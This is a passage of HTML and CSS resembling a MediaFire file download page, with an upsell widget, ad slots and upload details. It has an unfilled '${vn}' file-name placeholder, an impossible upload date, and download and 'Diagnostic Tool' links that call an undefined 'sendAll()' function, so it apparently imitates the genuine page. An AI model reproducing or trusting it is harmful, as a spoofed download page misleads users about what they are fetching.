            .header > .actions {
                flex-grow: 1;
                justify-content: flex-end;
                padding-right: 5px;
            }
            .header > .actions > li:first-child,
            .header > .actions > li:last-child {
                width: auto;
            }
            a#loggedin {
                display: flex;
                padding-right: 2px;
                align-items: center;
            }
            .user-nav > .avatar {
                margin: 0 0 0 15px
            }
            .mobile .ads .dl-btn-cont {
                width: 100%;
                min-width: 0;
            }
        }

        .center {
            gap: 20px 0;
            padding: 90px 0;
        }

        .page:not(.mobile) .dl-box {
            padding: 0 35px;
            max-width: 400px;
        }

        .page:not(.mobile) .dl-btn-cont {
            background: #fff;
            color: #222835;
            border-radius: 6px !important;
        }

        .page:not(.mobile) .dl-btn-cont > .icon {
            position: absolute;
            top: 67px;
            left: 20px;
            pointer-events: none;
            background-size: 32px;
            z-index: 2;
        }

        .page:not(.mobile) .promoDownloadName {
            margin-bottom: 0;
        }

        .page:not(.mobile) .dl-btn-label {
            color: #222835;
            font-size: 18px;
        }

        .page:not(.mobile) .dl-utility-nav {
            display: none;
        }

        .page:not(.mobile) .download_link.started.retry + .download_test_link {
            margin-top: -27px
        }

        .page:not(.mobile) .download_link .retry > span {
            position: relative;
            z-index: 3;
            background-color: #eee;
        }

        .page:not(.mobile) .dl-box > p {
            position: absolute;
            top: 150px;
            left: 35px;
            right: 35px;
            padding: 0 20px !important;
            background-color: #fff !important;
            color: #72767E !important;
            z-index: 1;
            border-radius: 0 !important;
        }

        .page:not(.mobile) .DLMobile-shareOptions {
            display: block;
            padding-top: 0;
        }

        .page:not(.mobile) .DLMobile-shareOptions > ul {
            margin: 0;
            gap: 0 20px;
            padding-top: 45px;
        }

        .page:not(.mobile) .DLMobile-shareOptions li {
            flex-basis: auto;
        }

        .page:not(.mobile) .DLMobile-shareOptions a {
            display: flex;
            align-items: center;
            padding: 0;
            margin: 0;
            background-color: #fff;
            color: #0070F0;
            font-size: 12px;
            line-height: 1.6;
        }

        .page:not(.mobile) .DLMobile-shareOptions a span {
            flex-shrink: 0;
            height: 24px;
            width: 24px;
            margin-right: 6px;
            background-color: #fff !important;
        }

        .mobile .center {
            justify-content: center;
        }

        @media (max-width: 1050px) {
            body {
                background-image: radial-gradient(circle at center, #000ECC 30%, #170088 80%, #19004A 110%);
            }

            .content {
                min-width: 0 !important;
            }

            .center {
                flex-direction: column;
                justify-content: center;
            }
        }

        @media (max-width: 550px) {
            .dl-box {
                width: auto;
                padding: 0 20px;
            }

            .dl-btn-cont {
                margin: 0 auto !important;
            }

            .page:not(.mobile) .dl-box {
                padding: 0 20px;
            }

            .page:not(.mobile) .dl-box > p {
                padding: 0 !important;
            }

            .mobile .dl-box {
                width: 100%;
                max-width: 490px;
                padding: 0 20px;
                box-sizing: border-box;
            }

            .mobile .dl-btn-cont {
                border-radius: 6px;
            }
        }
        html, body {
            height: 100%;
            background-attachment: fixed;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #04010D;
            background-image: radial-gradient(circle at 35% center, #000ECC 20%, #170088 75%, #19004A 150%);
            background-repeat: no-repeat;
        }

        .MFFolderPattern {
            background-image: url(//static.mediafire.com/images/download/subscription_upsell/folders_2.svg);
            background-position: center top;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            opacity: .35;
            pointer-events: none;
            z-index: 0;
        }

        .page {
            display: flex;
            align-items: center;
            flex-shrink: 0;
            box-sizing: border-box;
            padding: 120px 35px;
            width: 100%;
            min-height: 100%;
            background: transparent;
            justify-content: center;
        }

        .content {
            max-width: unset;
            min-width: auto;
            background: transparent;
            order: 1;
            padding: 0 35px;
            box-sizing: border-box;
            margin: 0;
        }

        .header {
            position: fixed;
            top: 0;
            left: 0;
            background: unset !important;
            z-index: 10;
        }
        .header .logo a {
            background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_u1_full_color_reversed.svg) 0 center / 180px auto no-repeat;
        }

        .page:not(.mobile) .dl-btn-cont {
            position: relative;
            top: auto;
            left: auto;
            right: auto;
            margin-bottom: 0;
            box-shadow: 0 5px 20px 0 rgba(0,0,0,.03), 0 3px 8px rgba(0,0,0,.06);
        }

        .dl-btn-label {
            color: #222835;
        }

        .download_link {
            height: auto;
            line-height: normal;
        }

        .page:not(.mobile) .download_link a {
            height: auto !important;
            padding: 21px 45px !important;
            border-radius: 4px !important;
            box-sizing: border-box;
            white-space: normal;
        }

        #footer {
            position: relative !important;
            overflow: unset !important;
            width: 100% !important;
            margin-top: 0;
            min-height: 0;
            flex-shrink: 0;
            box-sizing: border-box;
        }

        .MFUltra {
            padding: 0 35px;
            box-sizing: border-box;
            flex-grow: 1;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: start;
            justify-content: center;
            gap: 20px 0;
            max-width: 580px;
        }

        /*.MFUltra-MF {
            display: none;
            height: 70px;
            margin: 0 -70px;
            z-index: 1;
            position: relative;
        }*/

        /*.MFUltra-MF a {
            display: block;
            height: 70px;
            width: 180px;
            background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_u1_full_color_reversed.svg) 0 center/180px auto no-repeat;
            margin-left: 15px;
            text-indent: -9999px;
        }*/

        .MFUltra-content {
            margin: 0 auto;
            font-family: "Open Sans", "Helvetica Neue", "Arial", sans-serif;
            position: relative;
            z-index: 1;
            background-color: #05004D;
            border-radius: 16px;
            box-sizing: border-box;
            padding: 30px;
            width: 100%
        }

        .MFUltra-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 30px;
        }

        .MFUltra-heading {
            color: #fff;
            font-size: 26px;
            font-weight: 900;
            line-height: 1.4;
            margin-top: 0;
            margin-bottom: 0;
        }

        .MFUltra-introPill {
            display: inline-flex;
            align-items: center;
            gap: 0 10px;
            color: #fff;
            font-size: 11px;
            font-weight: 400;
            text-transform: uppercase;
            padding: 6px 15px 6px 6px;
            background-color: rgba(255,255,255,.2);
            border-radius: 999em;
            white-space: nowrap;
        }

        .MFUltra-introPill img {
            flex-shrink: 0;
        }

        .MFUltra-features {
            color: #fff;
            font-size: 13px;
            padding: 0 0 20px;
            display: flex;
        }

        .MFUltra-features ul {
            display: flex;
            flex-wrap: wrap;
            gap: 4px 10px;
            width: 100%;
            margin: 0;
        }

        /* .MFUltra-features li img {
            height: 18px;
            width: 18px;
        }
        */
        .MFUltra-features li {
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .UltraPlan-options {
            display: flex;
            flex-direction: column;
            gap: 4px 0;
            padding: 0 0 30px;
            color: #fff;
        }

        .UltraPlan-optionsHeading {
            font-size: 11px;
            font-weight: 400;
            text-transform: uppercase;
            text-align: left;
            margin-bottom: 4px;
            opacity: .8;
        }

        .UltraPlan-options label {
            display: flex;
            align-items: center;
            box-sizing: border-box;
            padding: 0 20px;
            position: relative;
            font-size: 14px;
            background-color: rgba(255,255,255,.1);
            border-radius: 6px;
            min-height: 56px;
            gap: 0 8px;
        }

        /* Custom radio styles */
        .UltraPlan-radio {
            -webkit-appearance: none;
            appearance: none;
            background-color: transparent;
            margin: 0;
            font: inherit;
            width: 12px;
            height: 12px;
            border: none;
            background-color: rgba(255,255,255,.2);
            border-radius: 50%;
            display: grid;
            place-content: center;
            position: relative;
            z-index: 1;
        }
        .UltraPlan-radio::before {
            content: "";
            width: 12px;
            height: 12px;
            border-radius: 50%;
            opacity: 0;
        }

        .UltraPlan-radio:checked::before {
            background-color: #33CC66;
            opacity: 1;
        }

        .UltraPlan-radioText {
            flex-grow: 1;
            position: relative;
            z-index: 1;
        }

        .UltraPlan-radio:checked + .UltraPlan-radioText {
            font-weight: bold;
        }

        .UltraPlan-radioDetail {
            display: inline-flex;
            font-size: 11px;
            background-color: rgba(255,255,255,.15);
            padding: 2px 6px;
            border-radius: 4px;
            text-transform: uppercase;
        }
        .UltraPlan-radioDetail.yearly-50 {
            text-transform: none;
        }
        .UltraPlan-radio:checked ~ .UltraPlan-radioDetail {
            background-color: #33CC66;
            color: #222835;
            border-radius: 4px;
        }

        .UltraPlan-radioSelected {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: transparent;
            box-shadow: inset 0 0 0 2px #17CF79;
            border-radius: 6px;
            opacity: 0;
        }

        .UltraPlan-radio:checked ~ .UltraPlan-radioSelected {
            opacity: 1;
            z-index: 0;
            pointer-events: none;
        }

        .MFUltra-content a {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #0070F0;
            border-radius: 6px !important;
            text-align: center;
            text-transform: uppercase;
            padding: 0 10px;
            min-height: 56px;
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            gap: 0 6px;
            box-shadow: 0 8px 32px -8px rgba(0,112,240,0.0), 0 16px 32px -16px rgba(0,112,240,0.0);
            box-sizing: border-box;
            transition: color 0.15s ease-in-out,background-color 0.15s ease-in-out, border-color 0.15s ease-in-out,box-shadow 0.15s ease-in-out;
        }

        .MFUltra-content a:not(:focus):hover {
            background-color: #0070F0;
            box-shadow: 0 8px 32px -8px rgba(0,112,240,0.72), 0 16px 32px -16px rgba(0,112,240,0.24);
            outline: none;
        }

        .MFUltra-content a:not(:focus):before {
            content: "";
            position: absolute;
            height: 100%;
            width: 100%;
            border-radius: 6px;
            z-index: -1;
            transition: all ease-out .2s;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #0070F0;
            box-shadow: 0 0 0 0 #0070F0;
        }

        .MFUltra-content a:hover:before {
            background-color: #0070F0;
            box-shadow: 0 0 0 4px #0070F0;
        }

        .MFUltra-downloadTest {
            display: none;
            align-items: center;
            width: 100%;
            margin: 0 auto;
            background-color: #05004D;
            border-radius: 16px;
            padding: 20px;
            box-sizing: border-box;
            color: #fff;
            line-height: normal;
            font-size: 13px;
            gap: 0 6px;
            position: relative;
        }

        .MFUltra-downloadTest span:first-child {
            font-weight: 600;
        }

        .MFUltra-downloadTest span:nth-child(2) {
            flex-shrink: 1;
            min-width: 0;
            word-break: break-word;
        }

        .MFUltra-downloadTest a {
            display: flex;
            align-items: center;
            flex-shrink: 0;
            color: #fff;
            background-color: #05004D;
            font-size: 13px;
            padding: 6px 8px;
            margin-left: auto;
            border-radius: 6px;
            gap: 0 6px;
            transition: all ease-out .2s;
            position: relative;
            box-shadow: inset 0 0 0 1px rgba(255,255,255,.3);
            background-image: linear-gradient(120deg,transparent,rgba(50, 100, 248, 0.8),transparent);
            background-position: -200px center;
            background-repeat: no-repeat;
            animation: shine 6s ease-in-out infinite;
        }

        @keyframes shine {
            0%, 70% {
                background-position: -200px center;
            }
            100% {
                background-position: 200px center;
            }
        }

        .MFUltra-downloadTest a:hover {
            background-color: #0070F0;
            background-image: none;
            box-shadow: none;
        }

        @media (max-width: 1150px) {
            .content {
                padding: 0 20px;
            }

            .MFUltra {
                max-width: 520px;
                padding: 0 20px;
                gap: 10px 0;
            }

            .MFUltra-content {
                padding: 20px;
            }

            .MFUltra-introPill {
                display: none;
            }

            .MFUltra-header {
                margin-bottom: 20px;
            }

            .MFUltra-heading {
                font-size: 20px;
            }

            .MFUltra-features li:nth-child(4) {
                display: none;
            }

            .UltraPlan-options {
                padding-bottom: 20px;
            }

            .UltraPlan-optionsHeading {
                font-size: 10px;
            }

            .UltraPlan-options label {
                min-height: 40px;
                padding: 0 10px;
            }

            .UltraPlan-radioText {
                font-size: 13px;
            }

            .UltraPlan-radioDetail {
                font-size: 10px;
            }

            .MFUltra-downloadTest {
                font-size: 12px;
                padding: 10px;
            }

            .MFUltra-downloadTest span:first-child {
                display: none;
            }
        }

        @media (max-width: 990px) {
            .MFUltra-features li:nth-child(4) {
                display: none;
            }
        }

        @media (max-width: 900px) {
            body {
                background-image: radial-gradient(circle at center 200px, #000ECC 30%, #170088 85%, #19004A 250%);
            }

            .page {
                flex-direction: column;
                flex-grow: 1;
                padding: 70px 0 20px;
                min-height: auto;
            }

            .content {
                width: 100%;
            }

            .header {
                right: 0;
                margin-top: 0;
                background-color: rgba(18,0,87,.3) !important;
                width: auto;
                height: 50px;
                display: flex;
                align-items: center;
                padding: 0 10px;
                backdrop-filter: blur(25px);
            }

            .header .actions {
                margin: 0 0 0 auto;
                display: flex;
            }

            .header > .actions > li {
                width: auto;
            }

            .header > .actions > li:first-child {
                width: auto;
            }

            .header > .actions > li > a {
                width: auto;
                position: static;
                padding: 0 8px;
                font-size: 10px;
            }

            #loggedin {
                display: flex;
                align-items: center;
                justify-content: flex-end;
                padding: 0 2px;
            }

            #loggedin .avatar {
                flex-shrink: 0;
                margin: 0;
            }

            #loggedin_dropdown {
                left: auto;
                right: 0;
            }

            .page:not(.mobile) .dl-btn-cont {
                width: auto;
                max-width: 430px;
                margin: 0 auto 30px;
                padding: 20px 30px;
            }

            .mobile .dl-btn-cont {
                margin-bottom: 30px;
            }

            .dl-utility-nav ul li {
                margin: 5px 20px 5px 0;
            }

            .MFUltra {
                max-width: 490px;
                margin-bottom: 20px;
                width: 100%;
            }

            .MFUltra-heading {
                font-size: 20px;
            }

            .MFUltra-features li:nth-child(2) {
                display: flex;
            }

            .UltraPlan-options label {
                min-height: 36px;
                padding: 0 8px;
            }

            .UltraPlan-radioText {
                font-size: 13px;
            }

            .MFUltra-content a {
                min-height: 36px;
            }
        }

        @media (max-width: 530px) {
            .content {
                padding: 0;
            }

            .page {
                padding-bottom: 0;
            }

            .page:not(.mobile) .dl-btn-cont {
                max-width: 100%;
                margin: 0;
                border-radius: 0;
                box-shadow: 0 -1px 0 0 rgba(0,0,0,.07);
            }

            .mobile .dl-btn-cont {
                margin-bottom: 0;
                max-width: none;
                border-radius: 0;
                min-width: 280px;
            }

            .MFSpecialDiscountBanner img {
                width: 150px;
            }
        }

        @media (max-width: 400px) {
            .MFUltra-features li:nth-child(4) {
                display: none;
            }
        }

        @media (max-width: 380px) {
            .logo {
                width: 48px;
                overflow: hidden;
            }
        }

        /* Adjustments for mobile download button container */
        .mobile .content {
            min-width: 0;
            flex-shrink: 0;
        }

        .mobile .dl-btn-cont {
            margin: auto;
            position: relative;
            top: auto;
            right: auto;
            left: auto;
            min-width: 350px;
        }

        .mobile .dl-btn-labelWrap {
            top: 28px;
        }

        .mobile .promoDownloadName {
            margin-bottom: 8px;
        }

        .mobile .dl-btn-label {
            color: #fff;
        }

        .mobile .dl-btn-form {
            margin-bottom: 0;
        }

        .mobile .download_link {
            height: auto;
            line-height: normal;
        }

        .mobile .download_link a.input,
        .mobile .download_link input {
            height: 60px;
            line-height: 84px;
        }

        .mobile .download_link a:not(.input) {
            height: auto !important;
            padding: 21px 20px !important;
            border-radius: 4px !important;
            box-sizing: border-box;
            white-space: normal;
        }
    </style>

    <script type="text/javascript" src="//static.mediafire.com/js/upgrade_widget.js"></script>

    <div class="MFUltra">
        <div class="MFFolderPattern"></div>
        <!-- <h1 class="MFUltra-MF">
            <a href="/">MediaFire</a>
        </h1> -->
        <div class="MFUltra-content">
            <div class="MFUltra-header">
                <h2 class="MFUltra-heading">
                    Download Faster
                </h2>
                <div class="MFUltra-introPill">
                    <img alt="spark icon" src="//static.mediafire.com/images/download/subscription_upsell/zap_circle.svg" height="" width="18">
                    CDN POWERED SPEED
                </div>
            </div>
            <div class="MFUltra-features">
                <ul>
                    <li><img alt="timer icon" src="//static.mediafire.com/images/download/subscription_upsell/timer.svg" height="" width="18">No Waiting</li>
                    <li><img alt="spark icon" src="//static.mediafire.com/images/download/subscription_upsell/zap.svg" height="" width="18">Premium Storage</li>
                    <li><img alt="megaphone icon" src="//static.mediafire.com/images/download/subscription_upsell/megaphone.svg" height="" width="18">No Ads</li>
                    <li><img alt="crown icon" src="//static.mediafire.com/images/download/subscription_upsell/crown.svg" height="" width="18">Premium Status</li>
                </ul>
            </div>
            <div class="UltraPlan-options" style="">
                <!--<p class="UltraPlan-optionsHeading">Choose Plan:</p>-->
                <label>
                    <input type="radio" id="" name="mediaFire_ultra_radio" value="0" checked="" class="UltraPlan-radio" onchange="selectPlan()">
                    <span class="UltraPlan-radioText">Monthly: $3.99</span>
                    <span class="UltraPlan-radioDetail" style="text-transform: none;">Most Popular</span>
                    <span class="UltraPlan-radioSelected"></span>
                </label>
                <!--
                <label>
                    <input type="radio" id="" name="mediaFire_ultra_radio" value="1" class="UltraPlan-radio" onchange="selectPlan()">
                    <span class="UltraPlan-radioText">100GB, $18/month</span>
                    <span class="UltraPlan-radioDetail">10% Off</span>
                    <span class="UltraPlan-radioSelected"></span>
                </label>
                <label>
                    <input type="radio" id="" name="mediaFire_ultra_radio" value="2" class="UltraPlan-radio" onchange="selectPlan()">
                    <span class="UltraPlan-radioText">250GB, $30/month</span>
                    <span class="UltraPlan-radioDetail">40% Off</span>
                    <span class="UltraPlan-radioSelected"></span>
                </label>
                <label>
                    <input type="radio" id="" name="mediaFire_ultra_radio" value="3" class="UltraPlan-radio" onchange="selectPlan()">
                    <span class="UltraPlan-radioText">500GB, $55/month</span>
                    <span class="UltraPlan-radioDetail">45% Off</span>
                    <span class="UltraPlan-radioSelected"></span>
                </label>
                -->
                            </div>
            <a href="javascript:upsellClick()"><img alt="crown icon" src="//static.mediafire.com/images/download/subscription_upsell/zap_white.svg" height="" width="20">Download Faster Now</a>
        </div>
        <div class="MFUltra-downloadTest">
            <span>Test:</span>
            <span>ultra_test_download.zip (10MB)</span>
            <a href="#"><img src="//static.mediafire.com/images/download/subscription_upsell/download.svg" width="18" height="18" alt="download icon">Test Download Speed</a>
        </div>
    </div>
</div>        <div class="ads dl-box">
                    

<div class="dl-btn-cont">
            <div class="icon mp4 video video_mp4"></div>
        <div class="dl-btn-labelWrap">
                            <div class="promoDownloadName notranslate">
                    <div class="dl-btn-label"
                        title="${vn}.mp4">${vn}</div>
                </div>
                                    <div class="dl-utility-nav">
                <ul>
                    <li>
                        <a onclick="sendAll()"
                            target="_blank"
                            rel="noopener"
                            id="shareButton"
                            class="nopop g-Icon g-Icon--white g-Icon--share"
                            aria-labelledby="share-tooltip" title="More sharing options"></a>
                        <span id="share-tooltip" class="alt point-down tooltip">
                            More sharing options
                        </span>
                    </li>
                    <li>
                        <a href="https://www.mediafire.com/file/gpikhj7qgu0pyoz/${vn}.mp4/file"
                            target="_blank"
                            rel="noopener"
                            id="copyShareURL"
                            class="nopop g-Icon g-Icon--white g-Icon--link"
                            aria-labelledby="copy-tooltip" title="Copy file link to clipboard"></a>
                        <span id="copy-tooltip" class="alt point-down tooltip">
                            Copy file link to clipboard
                        </span>
                    </li>
                    <li>
                        <a href
                            id="saveButton"
                            class="g-Icon g-Icon--white g-Icon--add"
                            aria-labelledby="save-tooltip" title="Save file to My Files"></a>
                        <span id="save-tooltip" class="alt point-down tooltip">
                            Save file to My Files
                        </span>
                    </li>
                    <noscript>
                        <style type="text/css">
                            #shareButton, #copyShareURL, #saveButton { display: none }
                        </style>
                    </noscript>
                </ul>
            </div>
                    </div>
        <form method="post"               name="download"
              class="dl-btn-form"
              autocomplete="off"
        >
            <input type="hidden"
                   name="security"
                   value="1749545354.4714f814e420db1f7ef04b803b80841690f3e708464c89dea16d7ab896bd8a8a"
            >
            
            <div class="download_link" id="download_link">
    <!-- IF THIS IS TRADITIONAL -->
    <a class="preparing" href="#"><span>Preparing Download</span><span id="preparing_count_down"></span><span class="js_note">Be sure JavaScript is enabled.</span></a>

            <a class="input popsok"
           aria-label="Download file"
onclick="sendAll()"
           id="downloadButton"
           rel="nofollow">
                Download in a new tab (3.18MB)
        </a>
        <a class="starting" href="#"><span>Your download is starting in a new tab...</span></a>
    <a class="retry" href="https://www.mediafire.com/download_repair.php?qkey=gpikhj7qgu0pyoz&amp;dkey=1qmulq7dlek&amp;template=55&amp;origin=click_button">
        <span class="notranslate">Your download started in a new tab.</span>
    </a>
    <script type="text/javascript">
     (function() {
         var dl = document.getElementById('download_link');
         if (!dl) return;
         var init = false;
         var delayInSeconds = 0;

         function retry() {
             dl.className += ' retry';
         };

         function download() {
             dl.className += ' started';
             window.dlStarted = true;
                             setTimeout(retry, 16000);
                      };

         window.initDownload = function() {
             if (init) return;
             init = true;
             dl.className = 'download_link';
             dl.onclick = download;
         };

         window.countDown = function() {
            document.querySelector('#preparing_count_down').innerText = ' ' + delayInSeconds + 's';
            delayInSeconds--;
            if (delayInSeconds > 0) {
                setTimeout(countDown, 998);
            }
         }

                  initDownload();
              })();
    </script>
</div>

            <a onclick="sendAll()" class="download_test_link">
                Download Diagnostic Tool
            </a>
        </form>
    
    <style>
p.DlBtnUltraUpsell {
    font-size: 11px;
    text-align: center;
    line-height: normal;
    color: #C0C0C0;
    background-color: #383838;
    padding: 5px 10px;
    border-radius: 0 0 6px 6px;
    box-shadow: inset 0 1px 0 0 rgba(255,255,255,.05);
    cursor: pointer;
}
.page:not(.mobile) .dl-box > p.DlBtnUltraUpsell {
    position: unset;
    color: #C0C0C0 !important;
    background-color: #383838 !important;
    padding: 10px 10px 12px !important;
    border-radius: 0 0 6px 6px !important;
}
p.DlBtnUltraUpsell button {
    color: #fff;
    background: #0070F0;
    background: var(--mf-blue4);
    border: 0;
    text-transform: uppercase;
    padding: 6px;
    margin-left: 2px;
    border-radius: 3px;
    font-size: 11px;
    font-weight: bold;
    line-height: 11px;
    cursor: pointer;
}
p.DlBtnUltraUpsell:hover button {
    background: #1080F8;
}
.mobile	p.DlBtnUltraUpsell span.try_text {
    display: none;
}
.dl-promo-cont {
    background: unset;
    color: var(--mf-gray5);
}
.dl-promo-cont:hover {
    color: var(--mf-gray6);
}
.dl-promo-cont>span {
    color: #fff;
}
.mobile .download_link a, .mobile .download_link input, .mobile .download_link button, .mobile #authorize_dl_btn {
    border-radius: 4px 4px 0 0;
}
</style>
<script type="text/javascript">
    function upgradeToUltra() {
        if (window.upgradeWidget) {
            upgradeWidget.launch('ultra_50_monthly_b', (success, data) => {
                if (success) {
                    window.location.reload();
                }
            });
        }	else {
            window.location = "/upgrade/get_plan.php?pid=ultra_50_monthly_b";
        }
    }
</script>
<p class="DlBtnUltraUpsell"
    onclick="upgradeToUltra()"
>
    Download too slow?<span class="try_text"> Try MediaFire Ultra</span>
    <button>Download Faster Now</button>
</p>
            <div class="DLMobile-shareOptions">
                        <p>
                Clicking the download button above will start your download in a new tab and show a message from our advertising partners.            </p>
                        <ul>
                <li>
                    <a href="#share"
                        id="shareButtonMobile"
                        class="nopop">
                        <span></span>Share options
                    </a>
                </li>
                <li>
                    <a href
                        id="saveButtonMobile">
                        <span></span>Save to My Files
                    </a>
                </li>
                <!-- <li>
                    <a href="https://www.mediafire.com/file/gpikhj7qgu0pyoz/VID-20250610-WA0101.mp4/file"
                        target="_blank"
                        rel="noopener"
                        id="copyShareURLMobile"
                        class="nopop">
                        <span></span>Copy for messenger
                    </a>
                </li>
                <li>
                    <a href="https://facebook.com/share.php?u=https://www.mediafire.com/file/gpikhj7qgu0pyoz/VID-20250610-WA0101.mp4/file"
                        id="facebookShareButtonMobile"
                        target="_blank"
                        rel="noopener"
                        class="nopop">
                        <span></span>Post to Facebook
                    </a>
                </li> -->
            </ul>
        </div>
    </div>


<script type="text/javascript">
    var sticky = {
        threshold: 800,
        div: null,
        init: function() {
            this.div = document.getElementsByClassName('ads-mobile5')[0];
            if (this.div) {
                this.scroll();
                this.events();
            }
        },

        scroll: function() {
            if (this.div) {
                if (window.scrollY > this.threshold) {
                    this.div.classList.add('swapAd');
                } else {
                    this.div.classList.remove('swapAd');
                }
            }
        },

        debounce: function(func, wait, immediate) {
            var timeout;
            return function() {
                var context = this, args = arguments;
                var later = function() {
                    timeout = null;
                    if (!immediate) func.apply(context, args);
                };
                var callNow = immediate && !timeout;
                clearTimeout(timeout);
                timeout = setTimeout(later, wait);
                if (callNow) func.apply(context, args);
            };
        },

        events: function() {
            if (this.div) {
                var debouncedScroll = this.debounce(this.scroll.bind(this), 50);
                window.addEventListener('scroll', debouncedScroll);
            }
        }
    };

    document.addEventListener("DOMContentLoaded", sticky.init.bind(sticky));
</script>
                
                        <div class="dl-info">
                <div class="intro icon mp4 video video_mp4">
                    <div class="filename">${vn}.mp4</div>
                    <div class="filetype"><span>Video</span><span> (.MP4)<span></span></span></div>
                </div>
                <ul class="details">
                    <li>File size: <span>3.18MB</span></li>
                    <li>Uploaded: <span>2010-23-10 03:23:13</span></li>
                </ul>
                <div class="description">
                    <p class="description-subheading">About Video Formats</p>
                    <p>As with all media formats, video formats run the spectrum between high quality and low file size. Lossless compression for video files attempts to reduce the file size by removing redundancies.  Lossy compression schemes reduce filesize by discarding data without the viewer noticing. The Advanced Video Coding (AVC) standard is one of the most commonly used formats for recording, compressing, and distributing high definition video.</p>
                </div>
                <div class="sidebar">
                                        <div class="Download-compatibility">
                        <div style="margin-bottom: 0;">
                            <div class="filename">${vn}.mp4</div>
                        </div>
                        <label for="compat-select" style="display: block; margin-bottom: 10px;">System compatibility</label>
                        <select class="g-Select" id="compat-select" title="Select operating system">
                            <option value="windows"
                                                                 data-compat                            >
                                Windows                            </option>
                            <option value="osx"
                                                                 data-compat                            >
                                macOS                            </option>
                            <option value="linux"
                                                                 data-compat                            >
                                Linux                            </option>
                        </select>
                        <div class="Download-compatibilityStatus is-compatible" id="compat-supported">
                            <span></span>
                            <p>File is compatible with the selected operating system.</p>
                        </div>
                        <div class="Download-compatibilityStatus is-notCompatible" id="compat-unsupported" style="display:none">
                            <span></span>
                            <p>File is not compatible with the selected operating system.</p>
                        </div>
                        <script type="text/javascript">
                            var compatSelect = document.getElementById('compat-select');
                            var compat = document.getElementById('compat-supported');
                            var nonCompat = document.getElementById('compat-unsupported');
                            compatSelect.onchange = function(e) {
                                var options = e.target.options;
                                var selection = options[options.selectedIndex];
                                var supported = selection && selection.attributes['data-compat'];
                                compat.style.display = supported ? 'block' : 'none';
                                nonCompat.style.display = !supported ? 'block' : 'none';
                            };

                        </script>
                    </div>
                </div>
            </div>
                        </div>
</div>
<!-- Temp placement -->
            <div id="non-dl-content" class="nonDLContentWrap">
                                                                            <style type="text/css">
    #ezwrp-108 {
        width: 100%; height: 250px; top: 70px; position: absolute; align-items: center; justify-content: center; display: flex;
    }
</style>
<div id="ezwrp-108" class="ezoic_ad_unit">
    <div id="ezoic-pub-ad-placeholder-108">
    </div>
</div>            <style type="text/css">
                #div-gpt-ad-1575674121640-0 {
                    width: 100%; height: 250px; top: 70px; position: absolute; align-items: center; justify-content: center; display: flex;
                }
            </style>
            <div id="div-gpt-ad-1575674121640-0" class="google_ad_unit">
                <script type='text/javascript'>
                    googletag.cmd.push(function() {
                        if (googletag.pubadsReady) {
                            googletag.display('div-gpt-ad-1575674121640-0');
                        }
                    });
                </script>
            </div>
                                                        <style type="text/css">
    #ezwrp- {
        width: 100%; height: 100px; position: fixed; left: 0; right: 0; bottom: 0; display: flex; align-items: center; justify-content: center; z-index: 99999
    }
</style>
<div id="ezwrp-" class="ezoic_ad_unit">
    <div id="ezoic-pub-ad-placeholder-">
    </div>
</div>            <style type="text/css">
                #div-gpt-ad-1704985946846-0 {
                    width: 100%; height: 100px; position: fixed; left: 0; right: 0; bottom: 0; display: flex; align-items: center; justify-content: center; z-index: 99999
                }
            </style>
            <div id="div-gpt-ad-1704985946846-0" class="google_ad_unit">
                <script type='text/javascript'>
                    googletag.cmd.push(function() {
                        if (googletag.pubadsReady) {
                            googletag.display('div-gpt-ad-1704985946846-0');
                        }
                    });
                </script>
            </div>
                                                        <style type="text/css">
    #ezwrp-110 {
        width: 100%; height: 250px; bottom: 0; left: 0; display: flex; align-items: center; position: absolute; justify-content: center;
    }
</style>
<div id="ezwrp-110" class="ezoic_ad_unit">
    <div id="ezoic-pub-ad-placeholder-110">
    </div>
</div>            <style type="text/css">
                #div-gpt-ad-1579281193413-0 {
                    width: 100%; height: 250px; bottom: 0; left: 0; display: flex; align-items: center; position: absolute; justify-content: center;
                }
            </style>
            <div id="div-gpt-ad-1579281193413-0" class="google_ad_unit">
                <script type='text/javascript'>
                    googletag.cmd.push(function() {
                        if (googletag.pubadsReady) {
                            googletag.display('div-gpt-ad-1579281193413-0');
                        }
                    });
                </script>
            </div>
                            <script type="text/javascript">
                    window['adLazyLoadQueue'].push("div-gpt-ad-1579281193413-0");
                </script>                                                </div>
                            <!-- Details for this download
=================================-->
<div class="DLExtraInfo-wrap">

    <!-- Upload details for file
    =================================-->
    <div class="DLExtraInfo">
        <!-- Location + map -->
        <div class="DLExtraInfo-uploadLocation DLExtraInfo-column">
            <div class="lazyload DLExtraInfo-uploadLocationMap Continent" data-lazyclass="DLExtraInfo-uploadLocationMapBg">
                <span>Upload region:</span>
                <div class="lazyload DLExtraInfo-uploadLocationRegion" data-lazyclass="continent-as"></div>
            </div>
            <!-- <div class="DLExtraInfo-sectionHeading">This file&#8217;s upload location</div> -->
                        <div class="lazyload DLExtraInfo-sectionGraphic flag" data-lazyclass="flag-id"></div>
                        <div class="DLExtraInfo-sectionDetails">
                <p>This file was uploaded from Indonesia on June 10, 2025 at 3:23 AM</p>
            </div>
        </div>

        <div class="DLExtraInfo-upload DLExtraInfo-column">
            <!-- VirusTotal scan -->
            <div class="DLExtraInfo-virusTotal DLExtraInfo-row">
                <div class="DLExtraInfo-sectionGraphic">
                    <div class="lazyload DLExtraInfo-sectionGraphicCenter" data-lazyclass="DLExtraInfo-virusTotalImage"></div>
                </div>
                <div class="DLExtraInfo-sectionDetails">
                    <div class="DLExtraInfo-sectionHeading">VirusTotal scan</div>
                    <p>
                                                MediaFire scans high-risk files using VirusTotal.
                    </p>
                </div>
            </div>
            <!-- Like MediaFire on Facebook -->
            <div class="DLExtraInfo-Facebook DLExtraInfo-row">
                <div class="social-cont">
                    <div class="social-fb-cont">
                        <span id="social-fb-label">Like MediaFire on Facebook</span>
                        <iframe
                            class="lazyload nopop"
